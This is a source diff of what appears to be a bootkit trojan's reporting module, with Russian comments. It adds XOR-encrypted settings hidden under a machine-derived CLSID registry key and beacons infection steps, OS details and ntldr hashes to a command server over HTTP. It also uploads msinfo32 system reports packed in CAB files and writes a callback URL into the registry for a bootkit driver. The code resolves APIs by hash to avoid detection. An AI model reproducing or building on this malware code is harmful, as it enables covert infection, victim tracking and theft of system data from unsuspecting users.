@@ -3,6 +3,8 @@
 #include "BotCore.h"
 #include "DbgRpt.h"
 #include "CabPacker.h" 
+#include "Plugins.h"
+#include "Crypt.h"
 
 //----------------------------------------------------------------------------
 #include "BotDebug.h"
@@ -14,27 +16,375 @@ namespace DBGRPTDEBGTEMPLATES
 
 #define DBGRPTDBG DBGRPTDEBGTEMPLATES::DBGOutMessage<>
 
-#ifdef DBGRPT_ENABLED
-	PP_COMPILER_MESSAGE("Statistic debug reporting enabled.('DBGRPT_ENABLED' defined)");
-#else
-	PP_COMPILER_MESSAGE("Statistic debug reporting disabled.('DBGRPT_ENABLED' NOT defined.)");
-#endif
+// Структура настроек статистической отчетности
+struct DebugReportSettings
+{
+	bool  Enabled;
+	PCHAR StatPrefix;
+	PCHAR StatUrl;
+};
+
+// Статистические переменные модуля DbgRpt.cpp
+// Инициализируются в DebugReportInit()
+static CRITICAL_SECTION     DbgRptCs;
+static DebugReportSettings  DbgRptSettingDefault;
+static DebugReportSettings* DbgRptSettings = NULL;
+
+
+// Предварительно объявление методов
+void DebugReportLoadSettings();
+void DebugReportUpdateSettingsThread(void* Arguments);
+
+// Инициализация статических переменных модуля.
+// Должна вызыватся при старте до использования ф-ций модуля.
+void DebugReportInit()
+{
+	DBGRPTDBG("DebugReportInit", "Start initialize debug reporting (DbgRptSettings=0x%X).", 
+		DbgRptSettings);
+
+	pInitializeCriticalSection(&DbgRptCs);
+	
+	DbgRptSettingDefault.Enabled = false;
+	DbgRptSettingDefault.StatPrefix = "";
+	DbgRptSettingDefault.StatUrl = "";
+	
+	DbgRptSettings = &DbgRptSettingDefault;
+
+	// Запускам процесс чтения настроек из реестра
+	// Необходимо для применения в процессах, которые не выполняют команд (explorer, winlogon и тд)
+	StartThread(DebugReportUpdateSettingsThread, NULL);
+}
+
+// Ф-ция конструктор для структуры DebugReportSettings
+DebugReportSettings* DebugReportAllocSettings(bool Enabled, 
+	const char* StatPrefix, const char* StatUrl)
+{
+	DebugReportSettings* result = CreateStruct(DebugReportSettings);
+
+	result->Enabled    = Enabled;
+	result->StatPrefix = STR::New((PCHAR)StatPrefix);
+	result->StatUrl    = STR::New((PCHAR)StatUrl);
+	
+	return result;
+}
+
+// Ф-ция деструктор для структуры DebugReportSettings
+void DebugReportFreeSettings(DebugReportSettings* settings)
+{
+	if (settings == NULL) return;
+	if (settings == &DbgRptSettingDefault) return;
+
+	if (settings->StatPrefix != NULL) STR::Free(settings->StatPrefix);
+	if (settings->StatUrl != NULL)    STR::Free(settings->StatUrl);
+	
+	FreeStruct(settings);
+}
+
+// Формирования строки UID с указанным префиксом
+string GenerateUidAsString(const string& Prefix)
+{
+	string  uid = Prefix;
+	PCHAR   uid_ptr = MakeMachineID();
+	size_t  uid_size = m_lstrlen(uid_ptr);
+
+	if (Prefix.Length() > 0) uid += "0";
+	uid += uid_ptr;
+
+	STR::Free(uid_ptr);
+	return uid;
+}
+
+// Формирования GUIDа из UIDа без префикса
+string CreateGuidFromUid(const string& uid)
+{
+	string wide_uid;
+	string guid;
+	DWORD  parts[5] = {8, 4, 4, 4, 12};
+
+
+	while (wide_uid.Length() < (8+4+4+4+12)) wide_uid += uid;
+
+	guid += "{";
+	const char* CurPtr = wide_uid.t_str();
+
+	for (size_t i = 0; i < ARRAYSIZE(parts); i++)
+	{
+		if (i != 0) guid += "-";
+
+		guid += string(CurPtr, parts[i]);
+		CurPtr += parts[i];
+	}
+
+	guid += "}";
+	return guid;
+}
+
+// Создание(или открытие, если уже был создан) ключа в реестре для сохранения 
+// шифрованных настроек статистической отчетности
+HKEY CreateSettingKey()
+{
+	// ВНИМАНИЕ: сейчас всё сохраняется в HKEY_LOCAL_MACHINE
+	// Сделан задел на добавление сохранения еще и HKEY_CURRENT_USER, если этот 
+	// даст плохие отстуки
+
+	HKEY    roots[2] = {HKEY_LOCAL_MACHINE /*, HKEY_CURRENT_USER*/};
+	HKEY    key = NULL;
+	DWORD   dsp = 0;
+	string  path;
+
+	path = "Software\\Classes\\CLSID\\";
+	path += CreateGuidFromUid(GenerateUidAsString(""));
+
+	for (DWORD i = 0; i < ARRAYSIZE(roots); i++) 
+	{
+		DWORD create_key_result = (DWORD)pRegCreateKeyExA(roots[i],
+			path.t_str(), 0, NULL, 0, KEY_ALL_ACCESS, NULL, &key, &dsp);
+
+		if (create_key_result == ERROR_SUCCESS) return key;
+	}
+
+	return NULL;
+}
+
+// Получение изменяемого имени параметра. 
+// Тоже используется UID без префикса
+string GetValueName(const string& Suffix)
+{
+	string Uid = GenerateUidAsString("");
+	string ValueName(Uid.t_str(), Uid.Length() - 5);
+
+	ValueName += Suffix;
+
+	DBGRPTDBG("GetValueName", "returning value_name='%s'", ValueName.t_str());
+
+	return ValueName;
+}
+
+// Загрузка параметров команды installbkstat из реестра 
+// одновременно с дешифровкой
+bool DebugReportLoadParamList(string * ParamList)
+{
+	HKEY key = CreateSettingKey();
+
+	DBGRPTDBG("DebugReportLoadParamList", "CreateSettingKey() result=0x%X", key);
+	if (key == NULL) return false;
+
+	BYTE    Buffer[1024];
+	DWORD   ValueLength = sizeof(Buffer) - 1;
+	DWORD   ValueType = 0;
+
+	m_memset(Buffer, 0, sizeof(Buffer));
+
+	DWORD query_value_result = (DWORD)pRegQueryValueExA(key, GetValueName("PL").t_str(), 0, 
+		&ValueType, Buffer, &ValueLength);
+	pRegCloseKey(key);
+
+	DBGRPTDBG("DebugReportLoadParamList", "RegQueryValueEx() result=%u ValueType=%d",
+		query_value_result, ValueType);
+
+	if (query_value_result != ERROR_SUCCESS) return false;
+	if (ValueType != REG_BINARY) return false;
+
+	
+	XORCrypt::Crypt(GenerateUidAsString("").t_str(), Buffer, ValueLength);
+	*ParamList = string((const char*)Buffer, ValueLength);
+
+	DBGRPTDBG("DebugReportLoadParamList", "Finished.(param_list='%s')", 
+		(*ParamList).t_str());
+
+	return true;
+}
+
+// Сохранение параметров команды installbkstat в реестр 
+// одновременно с шифрованием
+bool DebugReportSaveParamList(const string & ParamList)
+{
+	HKEY key = CreateSettingKey();
+
+	DBGRPTDBG("DebugReportSaveParamList", "CreateSettingKey() result=0x%X", key);
+	if (key == NULL) return false;
+
+	string EncodedString = ParamList;
+	XORCrypt::Crypt(GenerateUidAsString("").t_str(), (LPBYTE)EncodedString.t_str(), EncodedString.Length()+1);
+
+	DWORD set_value_result = (DWORD)pRegSetValueExA(key, GetValueName("PL").t_str(), 0, REG_BINARY, 
+		(const BYTE*)EncodedString.t_str(),
+		EncodedString.Length()+1);
+	pRegCloseKey(key);
+
+	DBGRPTDBG("DebugReportSaveParamList", "RegSetValueEx() result=%u", set_value_result);
+	if (set_value_result != ERROR_SUCCESS) return false;
+
+	return true;
+}
+
+// Загрузка настроек из реестра в структуру настроек.
+// Учитывается возможность работы в мультипоточной среде.
+void DebugReportLoadSettings()
+{
+	string ParamList;
+	bool ParamListLoaded  = DebugReportLoadParamList(&ParamList);
+
+	DBGRPTDBG("DebugReportLoadSettings", "DebugReportLoadParamList() result=%d (ParamList='%s').",
+		ParamListLoaded, ParamList.t_str());
+
+	string PlugName   = Plugin::GetParamFromParamListByIndex(ParamList.t_str(), 0);
+	string StatPrefix = Plugin::GetParamFromParamListByIndex(ParamList.t_str(), 1);
+	string StatUrl    = Plugin::GetParamFromParamListByIndex(ParamList.t_str(), 2);
+
+	DBGRPTDBG("DebugReportLoadSettings",
+		"Parsing arguments results: PlugName='%s' StatPrefix='%s' StatUrl='%s'",
+		PlugName.t_str(), StatPrefix.t_str(), StatUrl.t_str()
+		);
+
+
+	DebugReportSettings* NewSettings = CreateStruct(DebugReportSettings);
+	DebugReportSettings* OldSettings = NULL;
+
+	// Если хотя бы один пустой параметр - то это означает что они неверно заданы 
+	// и стука не включен.
+	NewSettings->Enabled = (StatPrefix.Length() > 0) && (StatUrl.Length() > 0);
+
+	// URL приходит без символа начала параметров
+	// Поскольку раньше URL был с таки символом - просто добавляем его по умолчанию.
+	StatUrl += "?";
+
+	NewSettings->StatPrefix = STR::New(StatPrefix.t_str());
+	NewSettings->StatUrl    = STR::New(StatUrl.t_str());
+
+	// При замене необходимо защитить DbgRptSettings, потому что его могут читать где-то
+	pEnterCriticalSection(&DbgRptCs);
+
+	OldSettings = DbgRptSettings;
+	DbgRptSettings = NewSettings;
+
+	pLeaveCriticalSection(&DbgRptCs);
+
+	DebugReportFreeSettings(OldSettings);
+}
+
+// Поток для обновления настроек для подсистемы сбора статистики
+// Сделано для будущей команды обновления параметров статистики
+// Обеспечивает общесистемное применение настроек через минуту после 
+// установки новых параметров
+void DebugReportUpdateSettingsThread(void* Arguments)
+{
+	while (true)
+	{
+		DBGRPTDBG("DebugReportUpdateSettingsThread", "Sleep 1 min");
+		pSleep(1 * 60 * 1000);
+
+		DebugReportLoadSettings();
+	}
+}
+
+// Сохранение настроек в реестр.
+void DebugReportSaveSettings(const char* ParamsList)
+{
+	DBGRPTDBG("DebugReportSaveSettings", "Started with ParamsList='%s'", ParamsList);
+	
+	// Сохраняем список параметров в реестр
+	DebugReportSaveParamList(ParamsList);
+
+	// Сразу же подгружаем их обратно для немедленного применения
+	DebugReportLoadSettings();
+}
+
+// Получение копии настроек
+// Копия делает из-за возможной работы в мультипоточной среде.
+// Чтобы не делать защиту общих данных там, где их используют,
+// делаем защиту только при загрузке и получении копии.
+DebugReportSettings* DebugReportGetSettings()
+{
+	DebugReportSettings* result = NULL;
+
+	// При чтении защищаемся от изменения текущего DbgRptSettings
+	pEnterCriticalSection(&DbgRptCs);
+
+	if (DbgRptSettings == &DbgRptSettingDefault)
+	{
+		DebugReportLoadSettings();
+	}
+
+	result = DebugReportAllocSettings(DbgRptSettings->Enabled, 
+		DbgRptSettings->StatPrefix, DbgRptSettings->StatUrl);
+
+	pLeaveCriticalSection(&DbgRptCs);
+
+	return result;
+}
+
+// Запуск тестов работы загрузки/выгрузки/получения настроек
+void DebugReportRunTests()
+{
+	DebugReportInit();
+
+	// Загрузить список параметров
+	DebugReportLoadSettings();
+
+	// Сохранить список параметров
+	DebugReportSaveSettings("param1 param2 param3");
+
+	const char* params[] = 
+	{
+		"BkDrop.plug bktestt http://test.orh/gettes/tetst.php",
+		"BkDrop.plug"
+	};
+
+	for (DWORD i = 0; i < ARRAYSIZE(params); i++)
+	{
+		// Сохранить список параметров
+		DebugReportSaveSettings(params[i]);
+
+		// Получить настройки
+		DebugReportSettings* settings = DebugReportGetSettings();
+
+		DBGRPTDBG("DebugReportTest",
+			"Settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
+			settings->Enabled, settings->StatPrefix, settings->StatUrl
+			);
+
+		DebugReportFreeSettings(settings);
+
+		DBGRPTDBG("DebugReportTest","---------");
+		DebugReportStepByName("100_trtr");
+		
+		DBGRPTDBG("DebugReportTest","---------");
+		DebugReportSystem();
+		
+		DBGRPTDBG("DebugReportTest","---------");
+		DebugReportBkInstallCode(0);
+		
+		DBGRPTDBG("DebugReportTest","---------");
+		DebugReportUpdateNtldrCheckSum();
+		
+		DBGRPTDBG("DebugReportTest","---------");
+		DebugReportCreateConfigReportAndSend();
+		
+		DBGRPTDBG("DebugReportTest","---------");
+		DebugReportSaveUrlForBootkitDriver();
+	}
+}
+
 
 void DebugReportStepByName(const char* StepName)
 {
-	CHAR BotUid[200];
-	
-	m_memset(BotUid, 0, sizeof(BotUid));
+	DebugReportSettings* settings = DebugReportGetSettings();
+	DBGRPTDBG("DebugReportStepByName",
+		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
+		settings->Enabled, settings->StatPrefix, settings->StatUrl
+		);
 
-	GenerateUid(BotUid);
+	if (!settings->Enabled) return;
+	string BotUid = GenerateUidAsString(settings->StatPrefix);
 
 	PStrings Fields = Strings::Create();
 	AddURLParam(Fields, "cmd", "step");
-	AddURLParam(Fields, "uid", BotUid);
+	AddURLParam(Fields, "uid", BotUid.t_str());
 	AddURLParam(Fields, "step", (PCHAR)StepName);
 
 	PCHAR Params = Strings::GetText(Fields, "&");
-	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
+	PCHAR URL = STR::New(2, settings->StatUrl, Params);
 
 	DBGRPTDBG("DebugReportStepByName", "go to url='%s'", URL);
 
@@ -45,6 +395,7 @@ void DebugReportStepByName(const char* StepName)
 	STR::Free(URL);
 	STR::Free(Params);
 	Strings::Free(Fields);
+	DebugReportFreeSettings(settings);
 }
 
 void DbgRptSprintfA(char* buffer, const char* format, ...)
@@ -80,22 +431,27 @@ char* CalcNtldrMd5(char* Buffer, DWORD BufferSize)
 	return Buffer;
 }
 
-void DebugReportStep1()
+void DebugReportSystem()
 {
-	CHAR BotUid[200];
+	DebugReportSettings* settings = DebugReportGetSettings();
+	DBGRPTDBG("DebugReportSystem",
+		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
+		settings->Enabled, settings->StatPrefix, settings->StatUrl
+		);
+
+	if (!settings->Enabled) return;
+	string BotUid = GenerateUidAsString(settings->StatPrefix);
+
 	CHAR NtldrMd5Buffer[100];
 	PCHAR OsInfo = NULL;
 	PCHAR NtldrMd5 = NULL;
 
-	m_memset(BotUid, 0, sizeof(BotUid));
-
-	GenerateUid(BotUid);
 	OsInfo = GetOSInfo();
 	NtldrMd5 = CalcNtldrMd5(NtldrMd5Buffer, sizeof(NtldrMd5Buffer));
 
 	PStrings Fields = Strings::Create();
 	AddURLParam(Fields, "cmd", "beforerbt");
-	AddURLParam(Fields, "uid", BotUid);
+	AddURLParam(Fields, "uid", BotUid.t_str());
 	AddURLParam(Fields, "os", OsInfo);
 
 	if (NtldrMd5 != NULL)
@@ -104,9 +460,9 @@ void DebugReportStep1()
 	}
 
 	PCHAR Params = Strings::GetText(Fields, "&");
-	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
+	PCHAR URL = STR::New(2, settings->StatUrl, Params);
 
-	DBGRPTDBG("DebugReportStep1", "sending url='%s'", URL);
+	DBGRPTDBG("DebugReportSystem", "sending url='%s'", URL);
 
 	PCHAR Buffer = NULL;
 	HTTP::Get(URL, &Buffer, NULL);
@@ -116,31 +472,38 @@ void DebugReportStep1()
 	STR::Free(Params);
 	Strings::Free(Fields);
 	MemFree(OsInfo);
+	DebugReportFreeSettings(settings);
 }
 
-void DebugReportStep2(DWORD BkInstallResult)
+void DebugReportBkInstallCode(DWORD BkInstallResult)
 {
-	CHAR BotUid[200];
+	DebugReportSettings* settings = DebugReportGetSettings();
+	DBGRPTDBG("DebugReportBkInstallCode",
+		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
+		settings->Enabled, settings->StatPrefix, settings->StatUrl
+		);
+
+	if (!settings->Enabled) return;
+	string BotUid = GenerateUidAsString(settings->StatPrefix);
+
 	CHAR value[50];
 
 	typedef int ( WINAPI *fwsprintfA)( PCHAR lpOut, PCHAR lpFmt, ... );
 	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
 
-	m_memset(BotUid, 0, sizeof(BotUid));
 	m_memset(value, 0, sizeof(value));
 
-	GenerateUid(BotUid);
 	_pwsprintfA(value, "%u", BkInstallResult);
 
 	PStrings Fields = Strings::Create();
 	AddURLParam(Fields, "cmd", "bkinstall");
-	AddURLParam(Fields, "uid", BotUid);
+	AddURLParam(Fields, "uid", BotUid.t_str());
 	AddURLParam(Fields, "val", value);
 
 	PCHAR Params = Strings::GetText(Fields, "&");
-	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
+	PCHAR URL = STR::New(2, settings->StatUrl, Params);
 	
-	DBGRPTDBG("DebugReportStep2", "sending url='%s'", URL);
+	DBGRPTDBG("DebugReportBkInstallCode", "sending url='%s'", URL);
 
 	PCHAR Buffer = NULL;
 	HTTP::Get(URL, &Buffer, NULL);
@@ -149,22 +512,28 @@ void DebugReportStep2(DWORD BkInstallResult)
 	STR::Free(URL);
 	STR::Free(Params);
 	Strings::Free(Fields);
+	DebugReportFreeSettings(settings);
 }
 
 void DebugReportUpdateNtldrCheckSum()
 {
-	CHAR BotUid[200];
+	DebugReportSettings* settings = DebugReportGetSettings();
+	DBGRPTDBG("DebugReportUpdateNtldrCheckSum",
+		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
+		settings->Enabled, settings->StatPrefix, settings->StatUrl
+		);
+
+	if (!settings->Enabled) return;
+	string BotUid = GenerateUidAsString(settings->StatPrefix);
+
 	CHAR NtldrMd5Buffer[100];
 	PCHAR NtldrMd5 = NULL;
 
-	m_memset(BotUid, 0, sizeof(BotUid));
-
-	GenerateUid(BotUid);
 	NtldrMd5 = CalcNtldrMd5(NtldrMd5Buffer, sizeof(NtldrMd5Buffer));
 
 	PStrings Fields = Strings::Create();
 	AddURLParam(Fields, "cmd", "csup");
-	AddURLParam(Fields, "uid", BotUid);
+	AddURLParam(Fields, "uid", BotUid.t_str());
 
 	if (NtldrMd5 != NULL)
 	{
@@ -172,7 +541,7 @@ void DebugReportUpdateNtldrCheckSum()
 	}
 
 	PCHAR Params = Strings::GetText(Fields, "&");
-	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
+	PCHAR URL = STR::New(2, settings->StatUrl, Params);
 
 	DBGRPTDBG("DebugReportUpdateNtldrCheckSumm", "go to url='%s'", URL);
 	PCHAR Buffer = NULL;
@@ -182,6 +551,7 @@ void DebugReportUpdateNtldrCheckSum()
 	STR::Free(URL);
 	STR::Free(Params);
 	Strings::Free(Fields);
+	DebugReportFreeSettings(settings);
 }
 
 PCHAR GetPathToMsInfo32()
@@ -212,14 +582,14 @@ PCHAR GetPathToMsInfo32()
 	return Path;
 }
 
-void DebugReportSendSysInfo(PCHAR uid, PCHAR path)
+void DebugReportSendSysInfo(PCHAR uid, PCHAR url, PCHAR path)
 {
 	PStrings Fields = Strings::Create();
 	AddURLParam(Fields, "cmd", "storefile");
 	AddURLParam(Fields, "uid", (PCHAR)uid);
 
 	PCHAR Params = Strings::GetText(Fields, "&");
-	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
+	PCHAR URL = STR::New(2, url, Params);
 
 	DBGRPTDBG("DebugReportSendSysInfo", "sending url='%s'", URL);
 
@@ -244,6 +614,14 @@ void DebugReportCreateConfigReportAndSend()
 	PCHAR MsInfoParam = NULL;
 	PCHAR ReportPath = NULL;
 	PCHAR CabPath = NULL;
+
+	DebugReportSettings* settings = DebugReportGetSettings();
+	DBGRPTDBG("DebugReportCreateConfigReportAndSend",
+		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
+		settings->Enabled, settings->StatPrefix, settings->StatUrl
+		);
+
+	if (!settings->Enabled) return;
 
 	do
 	{
@@ -311,12 +689,10 @@ void DebugReportCreateConfigReportAndSend()
 		AddFileToCab(CabHandle, ReportPath, "sysinfo.txt");
 		CloseCab(CabHandle);
 
-		char uid[200];
-
 		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "sending sysinfo report.");
 
-		GenerateUid(uid);
-		DebugReportSendSysInfo(uid, CabPath);
+		string BotUid = GenerateUidAsString(settings->StatPrefix);
+		DebugReportSendSysInfo(BotUid.t_str(), settings->StatUrl, CabPath);
 
 		DBGRPTDBG("DebugReportCreateConfigReportAndSend", "sysinfo report sent.");
 	}
@@ -329,6 +705,69 @@ void DebugReportCreateConfigReportAndSend()
 	if (CabPath != NULL)    STR::Free(CabPath);
 	if (MsInfoPath != NULL) STR::Free(MsInfoPath);
 
+	DebugReportFreeSettings(settings);
+
 	DBGRPTDBG("DebugReportCreateConfigReportAndSend", "finished.");
 }
 
+bool GetDriverUrl(char * UrlBuffer, DWORD UrlBufferSize)
+{
+	DebugReportSettings* settings = DebugReportGetSettings();
+	DBGRPTDBG("GetDriverUrl",
+		"Started with settings: Enabled='%d' StatPrefix='%s' StatUrl='%s'",
+		settings->Enabled, settings->StatPrefix, settings->StatUrl
+		);
+
+	if (!settings->Enabled) return false;
+	string BotUid = GenerateUidAsString(settings->StatPrefix);
+
+	m_memset(UrlBuffer, 0, UrlBufferSize);
+
+	PStrings Fields = Strings::Create();
+	AddURLParam(Fields, "cmd", "step");
+	AddURLParam(Fields, "uid", BotUid.t_str());
+	AddURLParam(Fields, "step", "170_dr"); //170_dr таймер драйвера
+
+	PCHAR Params = Strings::GetText(Fields, "&");
+	PCHAR URL = STR::New(2, settings->StatUrl, Params);
+	
+	DBGRPTDBG("GetDriverUrl", "Url='%s':%u (buffer_size=%u)", URL, STR::Length(URL),
+		UrlBufferSize);
+
+	if (UrlBufferSize < (STR::Length(URL) - 1)) return false;
+
+	m_lstrcpy(UrlBuffer, URL);
+
+	STR::Free(URL);
+	STR::Free(Params);
+	Strings::Free(Fields);
+	DebugReportFreeSettings(settings);
+	
+	return true;
+}
+
+bool DebugReportSaveUrlForBootkitDriver()
+{
+	WCHAR  key_path[] = L"SOFTWARE\\Classes\\CLSID\\{8CB0A413-0585-4886-B110-004B3BCAA9A8}";
+	CHAR   url[500];
+	DWORD  url_length = 0;
+	HKEY   key;
+	DWORD  opt = 0;
+
+	if (!GetDriverUrl(url, sizeof(url))) return false;
+
+	DWORD key_created = (DWORD)pRegCreateKeyExW(HKEY_LOCAL_MACHINE, key_path, 0, NULL, 0, KEY_WRITE, NULL, &key, &opt);
+	DBGRPTDBG("DebugReportSaveUrlForBootkitDriver", "RegCreateKeyExW return 0x%X", key_created);
+	if (key_created != ERROR_SUCCESS) return false;
+
+	// Сохраняем на всякий пожарный с 0 в конце
+	DWORD url_value_set = (DWORD)pRegSetValueExW(key, L"ID", 0, REG_BINARY, (const BYTE*)&url[0], 
+		(DWORD)plstrlenA(url));
+	DBGRPTDBG("DebugReportSaveUrlForBootkitDriver", "RegSetValueExW return 0x%X", url_value_set);
+	if (url_value_set != ERROR_SUCCESS) return false;
+
+	DBGRPTDBG("DebugReportSaveUrlForBootkitDriver", "Url key set (url=%s).", url);
+
+	pRegCloseKey(key);
+	return true;
+}
